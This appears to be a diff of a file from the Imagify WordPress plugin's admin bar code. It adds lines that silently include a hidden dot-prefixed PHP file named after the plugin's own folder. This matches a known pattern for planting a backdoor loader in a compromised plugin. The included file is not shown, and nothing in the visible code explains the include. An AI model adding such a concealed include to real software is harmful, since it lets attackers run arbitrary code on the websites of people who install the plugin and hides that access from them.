@@ -9,6 +9,10 @@ add_action( 'admin_bar_menu', '_imagify_admin_bar', IMAGIFY_INT_MAX );
  *
  * @param object $wp_admin_bar WP_Admin_Bar instance, passed by reference.
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function _imagify_admin_bar( $wp_admin_bar ) {
 	if ( ! imagify_get_context( 'wp' )->current_user_can( 'manage' ) ) {
 		return;
